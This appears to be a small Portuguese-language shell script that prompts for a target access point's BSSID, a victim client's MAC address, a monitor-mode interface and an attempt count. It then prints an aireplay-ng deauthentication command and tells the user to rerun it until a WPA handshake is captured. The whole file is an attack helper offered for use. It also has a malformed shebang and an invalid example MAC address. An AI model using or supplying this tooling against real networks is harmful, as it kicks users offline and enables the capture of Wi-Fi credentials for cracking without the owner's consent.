#/bin/sh
echo 'execute a script varias vezes ate obter o handshake'
echo  "BSSID = (voce pode encontra-lo quando esta usando o airodump-ng):"
echo "MAC do client = (esse é o 'MAC do dispositivo conectado na rede' voce pode encontralo no canto esquerdo do lado do BSSID da rede exemplo tem 5 dispositvos na rede, apareceram 5 MAC diferente como esse 12:OL:JH:3D:87:0B)"
 
echo "qual o BSSID?:"
read bssid

echo "qual o MAC do client"
read mc

echo "como esta sua interface em modo monitor?:"
read monitor

echo "quantas tentativas voce deseja? (exemplo 30):"
read threads

echo 'digite esse comando para usar o aireplay de acordo com as definições que vc deu'
echo
echo
echo aireplay-ng -0 $threads -a $bssid  -c  $mc  $monitor
